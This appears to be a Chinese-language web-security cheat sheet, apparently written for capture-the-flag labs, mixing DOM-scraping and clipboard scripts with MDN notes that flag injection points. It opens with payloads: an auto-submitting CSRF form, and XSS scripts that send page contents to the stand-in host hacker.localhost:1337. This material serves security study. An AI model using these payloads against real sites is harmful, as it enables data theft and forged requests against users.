```html
<html>
<body>
    <form action=http://challenge.localhost:80/publish method=post>
        <input type=submit value=csrf>
    </form>
    <script>
        document.forms[0].submit()
    </script>
</body>
</html>
```

```html
<script>
fetch('/')
    .then(resp => resp.text())
    .then(text => 
        fetch("http://hacker.localhost:1337/", {
            method: "POST",
            body: text
        }))
</script>
```

以表单格式发送数据
```html
<script>
let formData = new FormData();
formData.append("名", "值");
fetch('/')
    .then(resp => resp.text())
    .then(text => 
        fetch("http://hacker.localhost:1337/", {
            method: "POST",
            body: formData
        }))
</script>
```

## 复制数据

复制到粘贴板，有时被阻止
```js
navigator.clipboard.writeText(out_str);
```

## ShadowRoot

https://developer.mozilla.org/zh-CN/docs/Web/API/ShadowRoot

Shadow DOM API 的 ShadowRoot 接口是一个 DOM 子树的根节点，它与文档的主 DOM 树分开渲染。

你可以通过使用一个元素的 Element.shadowRoot 属性来检索它的参考，假设它是由 Element.attachShadow() 创建的并使 mode 设置为 open.

```js
// 逐步添加字符串，最终使用剪贴板复制数据
let out_str = ""; 
// 选取最外层 shadowRoot
const egs_footer = document.querySelector("egs-footer").shadowRoot;
console.log(footer_cols.length); // 查看选取是否正确

// 选取其中各段
const footer_cols = egs_footer.querySelectorAll("epic-wf-footer-link-column");
console.log(footer_cols.length); // 查看选取是否正确

// 遍历各段
footer_cols.forEach(footer_col => {
    // 查看当前段的类型
    const col_type = footer_col.getAttribute("heading");
    console.log(col_type); 
    out_str += `${col_type}\n`;
    // 选取每段的 shadowRoot
    const footer_col_sr = footer_col.shadowRoot;
    // 选取链接元素合集
    const footer_link = footer_col_sr.querySelectorAll("epic-wf-footer-link");
    console.log(footer_link.length); // 查看选取是否正确

    // 遍历所有链接
    footer_link.forEach(link => {
        const label = link.getAttribute('label') || '';
        const href_template = link.getAttribute('hreftemplate') || '';

        let cur_str = `- ${label}\n\t- \`${href_template}\`\n`;
        console.log(cur_str);
        out_str += cur_str;
    });
});

// 复制最终输出字符串到粘贴板
navigator.clipboard.writeText(out_str).catch(()=>{
    // 若失败，则输出到控制台后手动复制
    console.log(out_str);
});
```

```js
let out_str = ""; 

const x = document.querySelectorAll(".cc-rewards-link-table__endpoint");

x.forEach(link => {
        const label = link.textContent || '';


        let cur_str = `${label}\n`;
        console.log(cur_str);
        out_str += cur_str;
    });

navigator.clipboard.writeText(out_str).catch(()=>{
    // 若失败，则输出到控制台后手动复制
    console.log(out_str);
});
```
## HTML 参考

### HTML 元素参考

#### iframe

https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/iframe

属性
- `sandbox` 
    控制 `<iframe>` 中的内容的限制。该属性的值可以为空以应用所有限制，也可以为空格分隔的标记以解除特定的限制：
    - `allow-forms` 点击劫持启用
        允许页面提交表单。

    - `allow-scripts` 点击劫持启用
        允许页面运行脚本（但不能创建弹窗）

    - `allow-top-navigation` 点击劫持不设置以应对框架破坏
        允许资源导航顶级（即名称为 `_top` 的）浏览上下文。

- `srcdoc`
    要嵌入的内联 HTML，会覆盖 `src` 属性。

#### form 表单元素

https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/form

属性
- `action` JS 伪协议注入点
    处理表单提交的 URL。这个值可被 `<button>`、`<input type="submit">` 或 `<input type="image">` 元素上的 `formaction` 属性覆盖。

#### button

属性
- `formaction` JS 伪协议注入点
    表示程序处理 `button` 提交信息的 URI。如果指定了，将重写 `button` 表单拥有者的`action`属性。

#### SVG

##### `<use>` 废弃的 JS 数据注入点

https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Element/use

从 SVG 文档中获取节点，并将它们复制到其他地方。其效果与将这些节点深度克隆到一个不可导出的 DOM 中，然后粘贴到 use 元素所在的位置相同，这与克隆的模版元素类似。

- 使用方法：hash 符号后接元素id `<use href="#元素id"`

- 安全演化：出于安全原因，在 `href` 属性中使用数据 URI 加载资源已被弃用。这适用于 `<use href="data:...`，以及使用 `set` 或 `setAttribute` 方法设置 `href` 的情况。

#### a 锚元素

属性
- `target`
    该属性指定在何处显示链接的 URL，作为浏览上下文的名称 `name`（标签、窗口或 `<iframe>`）。拥有特殊含义关键词